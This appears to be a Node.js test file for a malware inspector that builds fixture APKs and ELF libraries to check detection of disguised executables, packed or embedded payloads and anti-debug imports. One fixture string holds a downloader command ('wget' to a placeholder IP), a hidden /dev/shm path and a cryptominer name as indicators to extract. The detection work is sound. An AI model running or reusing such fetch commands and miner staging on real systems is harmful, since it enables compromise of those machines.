import { test } from 'node:test'
import assert from 'node:assert/strict'
import { inspectApk, extractIndicators } from '../lib/native.mjs'

// Stored (uncompressed) zip writer, enough to build a fixture APK.
function zip(files) {
  const parts = [], central = []
  let off = 0
  for (const [name, data] of Object.entries(files)) {
    const n = Buffer.from(name)
    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4)
    lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(n.length, 26)
    const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6)
    ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(n.length, 28); ch.writeUInt32LE(off, 42)
    parts.push(lh, n, data); central.push(ch, n)
    off += 30 + n.length + data.length
  }
  const cd = Buffer.concat(central)
  const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0)
  end.writeUInt16LE(central.length / 2, 8); end.writeUInt16LE(central.length / 2, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16)
  return Buffer.concat([...parts, cd, end])
}

// Minimal 64-bit ELF: one PT_LOAD, no section headers.
function elf(type, memsz) {
  const b = Buffer.alloc(64 + 56)
  b.write('\x7fELF', 0, 'latin1'); b[4] = 2; b[5] = 1
  b.writeUInt16LE(type, 16); b.writeUInt16LE(62, 18); b.writeBigUInt64LE(64n, 32)
  b.writeUInt16LE(56, 54); b.writeUInt16LE(1, 56)
  b.writeUInt32LE(1, 64); b.writeBigUInt64LE(BigInt(b.length), 96); b.writeBigUInt64LE(BigInt(memsz), 104)
  return b
}

test('flags an executable shipped as a library and a packed-looking one', () => {
  const r = inspectApk(zip({
    'classes.dex': Buffer.from('dex\n035\n'),
    'lib/x86_64/libok.so': elf(3, 120),
    'lib/x86_64/libkys.so': elf(2, 400000),
    'res/raw/blob': Buffer.from('QAAAAL17Qltr6A/3j+13Zvt=', 'latin1'),
  }))
  assert.equal(r.dexCount, 1)
  assert.equal(r.files.find(f => f.path.endsWith('libok.so')).elf.signals.includes('executable_named_as_library'), false)
  const kys = r.files.find(f => f.path.endsWith('libkys.so'))
  assert.equal(kys.elf.elfType, 'executable')
  assert.equal(kys.elf.packedLikely, true)
  assert.deepEqual(r.findings.map(f => f.rule_id).sort(), ['native.executable_as_library', 'native.packed'])
  assert.equal(r.files.find(f => f.path === 'res/raw/blob').kind, 'base64_text')
  assert.equal(r.artifactHashes.length, 4)
})

test('flags a non-ELF file under lib/ and nested dex in assets', () => {
  const r = inspectApk(zip({ 'lib/arm64-v8a/libx.so': Buffer.from('PK\x03\x04junk'), 'assets/p.bin': Buffer.from('dex\n035\n') }))
  assert.deepEqual(r.findings.map(f => f.rule_id).sort(), ['native.not_elf', 'res.embedded_payload'])
})

test('rejects non-zip input', () => assert.throws(() => inspectApk(Buffer.from('hello'))))

test('pulls indicators out of strings and skips ones already in a URL', () => {
  const blob = Buffer.from('\n\nwget -O q http://203.0.113.9/%s\nhttp://198.51.100.7:999\n198.51.100.7:999\n192.0.2.55\n127.0.0.1\n/dev/shm/.kwork\nxmrig\n')
  const r = extractIndicators(blob)
  assert.deepEqual(r.urls.sort(), ['http://198.51.100.7:999', 'http://203.0.113.9/%s'])
  assert.deepEqual(r.ipv4, ['192.0.2.55'])
  assert.deepEqual(r.paths, ['/dev/shm/.kwork'])
  assert.deepEqual(r.malware_names, ['xmrig'])
  assert.ok(r.commands[0].startsWith('wget -O q'))
})

// 64-bit shared object with a dynamic table (DT_NEEDED, DT_STRTAB, DT_SYMTAB, DT_HASH) and no section headers.
function dynElf(imports, tail = Buffer.alloc(0)) {
  const names = ['', 'libc.so', ...imports]
  const str = Buffer.from(names.join('\0') + '\0')
  const nameOff = []; let o = 0
  for (const n of names) { nameOff.push(o); o += n.length + 1 }
  const nsym = imports.length + 1
  const sym = Buffer.alloc(24 * nsym)
  imports.forEach((_, i) => sym.writeUInt32LE(nameOff[i + 2], 24 * (i + 1)))   // shndx stays 0: undefined
  const hash = Buffer.alloc(8 + 4 * (1 + nsym)); hash.writeUInt32LE(1, 0); hash.writeUInt32LE(nsym, 4)
  const dynLen = 16 * 5, base = 64 + 56 * 2
  const strAt = base + dynLen, symAt = strAt + str.length + ((8 - (strAt + str.length) % 8) % 8), hashAt = symAt + sym.length
  const dyn = Buffer.alloc(dynLen)
  ;[[1, nameOff[1]], [5, strAt], [6, symAt], [4, hashAt], [0, 0]].forEach(([t, v], i) => { dyn.writeBigUInt64LE(BigInt(t), 16 * i); dyn.writeBigUInt64LE(BigInt(v), 16 * i + 8) })
  const body = Buffer.concat([dyn, str, Buffer.alloc(symAt - strAt - str.length), sym, hash, tail])
  const h = Buffer.alloc(base)
  h.write('\x7fELF', 0, 'latin1'); h[4] = 2; h[5] = 1; h.writeUInt16LE(3, 16); h.writeUInt16LE(183, 18)
  h.writeBigUInt64LE(64n, 32); h.writeUInt16LE(56, 54); h.writeUInt16LE(2, 56)
  const total = base + body.length
  h.writeUInt32LE(1, 64); h.writeBigUInt64LE(BigInt(total), 96); h.writeBigUInt64LE(BigInt(total), 104)     // PT_LOAD, vaddr 0
  h.writeUInt32LE(2, 120); h.writeBigUInt64LE(BigInt(base), 128); h.writeBigUInt64LE(BigInt(base), 136); h.writeBigUInt64LE(BigInt(dynLen), 152)   // PT_DYNAMIC
  return Buffer.concat([h, body])
}

test('reads imports and needed libraries without section headers', () => {
  const r = inspectApk(zip({ 'lib/arm64-v8a/libnet.so': dynElf(['socket', 'connect', 'ptrace', 'strlen']) }))
  const d = r.files[0].elf.dynamic
  assert.deepEqual(d.needed, ['libc.so'])
  assert.deepEqual(d.imports, ['socket', 'connect', 'ptrace', 'strlen'])
  assert.deepEqual(d.capabilities.sort(), ['anti_debug', 'network'])
})

test('finds a file hidden inside a native library and a UPX marker', () => {
  const inner = Buffer.concat([Buffer.alloc(32), Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.from('dex\n035\0'), Buffer.from('UPX!')])
  const r = inspectApk(zip({ 'lib/arm64-v8a/libx.so': dynElf(['strlen'], inner) }))
  const e = r.files[0].elf
  assert.deepEqual(e.embedded.map(x => x.kind), ['elf', 'dex'])
  assert.ok(e.signals.includes('upx_marker'))
})
